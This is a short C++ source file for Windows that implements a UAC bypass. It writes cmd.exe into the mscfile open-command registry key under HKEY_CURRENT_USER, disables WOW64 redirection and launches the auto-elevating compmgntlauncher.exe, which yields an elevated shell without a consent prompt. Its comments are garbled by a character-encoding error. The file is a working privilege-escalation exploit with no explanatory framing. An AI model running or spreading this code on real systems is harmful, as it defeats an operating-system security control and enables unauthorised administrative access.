#include "stdafx.h"
#include <Windows.h>

void ShowError(char *pszText)
{
	char szErr[MAX_PATH] = { 0 };
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
#ifdef _DEBUG
	::MessageBox(NULL, szErr, "ERROR", MB_OK | MB_ICONERROR);
#endif
}


BOOL SetReg(char * lpszExePath){
	HKEY hKey = NULL;
	//������
	RegCreateKeyEx(
		HKEY_CURRENT_USER,
		"Software\\Classes\\mscfile\\Shell\\Open\\Command",
		0,
		NULL,
		0,
		KEY_WOW64_64KEY|KEY_ALL_ACCESS,
		NULL,
		&hKey,
		NULL);
	//���ü�ֵ
	RegSetValueEx(hKey,
		NULL,
		0,
		REG_SZ,
		(BYTE*)lpszExePath,
		(1+lstrlen(lpszExePath)));
	//�ر�ע���
	RegCloseKey(hKey);
	return TRUE;
}

int _tmain(int argc, _TCHAR * argv[]) {
	BOOL bRet = FALSE;
	PVOID OldValue = NULL;
	//�ر��ļ��ض�λ
	Wow64DisableWow64FsRedirection(&OldValue);
	//�޸�ע���
	bRet = SetReg("C:\\windows\\System32\\cmd.exe");
	if(bRet) {
		
		system("compmgntlauncher.exe");
		printf("ok\n");
	}
	else {
		printf("run error\n");
	}
	//�ָ��ļ��ض�λ
	Wow64RevertWow64FsRedirection(OldValue);
	system("pause");
	return 0;
}